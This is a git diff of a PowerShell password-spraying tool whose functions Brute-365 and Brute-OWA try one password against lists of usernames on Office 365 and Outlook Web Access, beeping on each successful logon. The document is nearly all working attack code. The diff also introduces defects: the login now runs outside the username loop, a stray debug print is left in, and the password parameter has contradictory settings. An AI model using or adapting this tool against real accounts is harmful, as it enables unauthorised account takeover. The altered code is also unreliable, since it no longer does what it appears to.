@@ -14,29 +14,38 @@ function Brute-365 {
         Brute-365 -csv .\targets.csv -Password "Winter2016!" -Beep
 #>
   Param(
-    [Parameter(Mandatory=$True,Position=1)]
+    [Parameter(Mandatory=$False)]
     [String]$csv,
 
+    [Parameter(Mandatory=$False)]
+    [String]$Username,
+
     [Parameter(Mandatory=$True)]
-    [String]$Password,
+    [String]$Password = $Null,
 
     [Parameter(Mandatory=$False)]
     [Switch]$Beep
   )
+  if (!$Username) {
+    if (!$csv) {
+      Write-Output "A username or CSV is required! Exiting.."
+      Break
+    }
     $usernames = Import-CSV $csv
     foreach($user in $usernames) {
       $username = $($user.Username)
-      $secpasswd = ConvertTo-SecureString $password -AsPlainText -Force
-      $mycreds = New-Object System.Management.Automation.PSCredential ($username, $secpasswd)
-      $connect = Connect-MsolService -Credential $mycreds
-      if ($connect -eq $null) {
-          Write-Output "Logon Successful for $username"
-          if ($Beep) {
-            [console]::beep(2000,500)
-          }
-      }
     } 
-}
+  } 
+  $secpasswd = ConvertTo-SecureString $password -AsPlainText -Force
+  $mycreds = New-Object System.Management.Automation.PSCredential ($username, $secpasswd)
+  $connect = Connect-MsolService -Credential $mycreds
+  if ($connect -eq $null) {
+      Write-Output "Logon Successful for $username"
+      if ($Beep) {
+        [console]::beep(2000,500)
+      }
+  }
+} 
   function Brute-OWA  {
       <#
     .SYNOPSIS
@@ -57,16 +66,19 @@ function Brute-365 {
   Param(
 
    [Parameter(Mandatory=$true)]
-   $URL,
+   [String]$URL,
 
    [Parameter(Mandatory=$true)]
-   $Domain,
+   [String]$Domain,
+
+   [Parameter(Mandatory=$false)]
+   [String]$csv,
+
+   [Parameter(Mandatory=$False)]
+   [String]$Username,
 
    [Parameter(Mandatory=$true)]
-   $csv,
-
-   [Parameter(Mandatory=$true)]
-   $Password,
+   [String]$Password,
 
    [Parameter(Mandatory=$False)]
     [Switch]$Beep
@@ -77,9 +89,17 @@ function Brute-365 {
   $Result = $False
   $StatusCode = 0
   $Latency = 0
-  $usernames = Import-CSV $csv
-  foreach($Username in $usernames) {
-  $Username = $($Username.Username)
+  if (!$Username) {
+    if (!$csv) {
+      Write-Output "A username or CSV is required! Exiting.."
+      Break
+    }
+    $usernames = Import-CSV $csv
+    foreach($user in $usernames) {
+      $username = $($user.Username)
+      write-host "here" $username
+    } 
+  } 
   $Username = $Domain + "\" + $Username
 
   try {
@@ -152,18 +172,17 @@ function Brute-365 {
   }
 }
     #Catch Exception, If any
-    catch
-    {
-      #Retrieve Status Code
-      $StatusCode = $Response.StatusCode
-      if ($StatusCode -notmatch '\d\d\d') {$StatusCode = 0}
-      $Result = $_.Exception.Message
-    }
-    Write-Output "Result: $Result"
-    if ($Result -notcontains "Failed") {
-      if ($Beep) {
-            [console]::beep(2000,500)
-          }
-    }
+  catch
+  {
+    #Retrieve Status Code
+    $StatusCode = $Response.StatusCode
+    if ($StatusCode -notmatch '\d\d\d') {$StatusCode = 0}
+    $Result = $_.Exception.Message
   }
-}  
+  Write-Output "Result: $Result"
+  if ($Result -notcontains "Failed") {
+    if ($Beep) {
+          [console]::beep(2000,500)
+        }
+  }
+} 
